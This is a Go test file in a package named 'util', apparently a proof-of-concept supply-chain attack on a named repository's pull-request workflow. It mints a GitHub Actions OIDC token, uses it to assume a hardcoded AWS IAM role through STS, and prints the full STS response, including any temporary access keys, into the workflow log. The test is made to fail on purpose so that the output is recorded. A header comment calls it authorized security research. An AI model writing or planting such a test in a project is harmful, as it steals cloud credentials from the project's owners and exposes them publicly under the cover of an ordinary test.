package util

// OIDC fork→assume-role supply-chain probe (authorized PoC, ireniumsecurity).
// Runs inside exa-labs/kuberay .github/workflows/test-job.yaml (pull_request,
// id-token: write). Mints the OIDC JWT and calls sts:AssumeRoleWithWebIdentity
// against the hardcoded shared role. Reads the result only; never enumerates
// AWS resources. The test intentionally FAILS so the probe output is captured
// in the workflow log (go test without -v suppresses passing-test output).

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"testing"
)

func TestOidcAssumeRoleProbe(t *testing.T) {
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqToken := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	fmt.Printf("OIDC_PROBE url_set=%v token_set=%v\n", reqURL != "", reqToken != "")
	if reqURL == "" || reqToken == "" {
		t.Fatalf("OIDC_PROBE_SKIPPED: OIDC env vars not present (id-token:write not effective for this run)")
	}

	sep := "?"
	if strings.Contains(reqURL, "?") {
		sep = "&"
	}
	audURL := reqURL + sep + "audience=sts.amazonaws.com"

	req, err := http.NewRequest("GET", audURL, nil)
	if err != nil {
		t.Fatalf("OIDC_PROBE_MINT_REQ_ERR: %v", err)
	}
	req.Header.Set("Authorization", "Bearer "+reqToken)
	req.Header.Set("Accept", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("OIDC_PROBE_MINT_HTTP_ERR: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	fmt.Printf("OIDC_PROBE_MINT status=%d body=%s\n", resp.StatusCode, string(body))

	var jr struct {
		Value string `json:"value"`
	}
	if err := json.Unmarshal(body, &jr); err != nil || jr.Value == "" {
		t.Fatalf("OIDC_PROBE_NO_JWT: err=%v body=%s", err, string(body))
	}
	fmt.Printf("OIDC_PROBE_JWT_LEN=%d\n", len(jr.Value))

	form := url.Values{}
	form.Set("Action", "AssumeRoleWithWebIdentity")
	form.Set("Version", "2011-06-15")
	form.Set("RoleArn", "arn:aws:iam::472386928882:role/github-actions-role")
	form.Set("RoleSessionName", "oidc-probe")
	form.Set("WebIdentityToken", jr.Value)

	stsReq, err := http.NewRequest("POST", "https://sts.amazonaws.com/", strings.NewReader(form.Encode()))
	if err != nil {
		t.Fatalf("OIDC_PROBE_STS_REQ_ERR: %v", err)
	}
	stsReq.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")

	stsResp, err := http.DefaultClient.Do(stsReq)
	if err != nil {
		t.Fatalf("OIDC_PROBE_STS_HTTP_ERR: %v", err)
	}
	stsBody, _ := io.ReadAll(stsResp.Body)
	stsResp.Body.Close()

	fmt.Printf("OIDC_PROBE_STS status=%d\n", stsResp.StatusCode)
	fmt.Printf("OIDC_PROBE_STS_BODY_BEGIN\n%s\nOIDC_PROBE_STS_BODY_END\n", string(stsBody))

	switch {
	case strings.Contains(string(stsBody), "AccessKeyId"):
		fmt.Println("OIDC_PROBE_RESULT: CREDENTIALS_OBTAINED_CRITICAL")
		t.Fatalf("OIDC_PROBE_RESULT: CREDENTIALS_OBTAINED_CRITICAL")
	case strings.Contains(string(stsBody), "AccessDenied"):
		fmt.Println("OIDC_PROBE_RESULT: ACCESS_DENIED_FALSIFIED")
		t.Fatalf("OIDC_PROBE_RESULT: ACCESS_DENIED_FALSIFIED")
	case strings.Contains(string(stsBody), "InvalidIdentityToken"):
		fmt.Println("OIDC_PROBE_RESULT: INVALID_IDENTITY_TOKEN_FALSIFIED")
		t.Fatalf("OIDC_PROBE_RESULT: INVALID_IDENTITY_TOKEN_FALSIFIED")
	default:
		fmt.Println("OIDC_PROBE_RESULT: UNKNOWN")
		t.Fatalf("OIDC_PROBE_RESULT: UNKNOWN: %s", string(stsBody))
	}
}
